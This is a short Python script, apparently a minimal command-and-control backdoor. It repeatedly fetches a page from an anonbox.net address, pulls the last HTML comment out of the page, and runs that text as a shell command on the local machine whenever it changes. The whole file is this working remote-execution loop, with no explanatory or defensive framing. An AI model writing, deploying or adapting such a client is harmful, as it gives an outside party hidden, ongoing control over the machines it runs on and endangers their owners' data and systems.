import requests,subprocess,re

last = ""

while True:
        lnk = "https://anonbox.net/bshrq/wwvkdpy4xu"
        r = requests.get(lnk)
        body = r.text

        cmd = re.findall('<!--(.*?)-->',body,re.DOTALL)

        if(cmd[len(cmd)-1] !=  last):
                try:
                        proc = subprocess.check_output([cmd[len(cmd)-1]],shell=True)
                        last = cmd[len(cmd)-1]
                        print(proc)
                except: pass
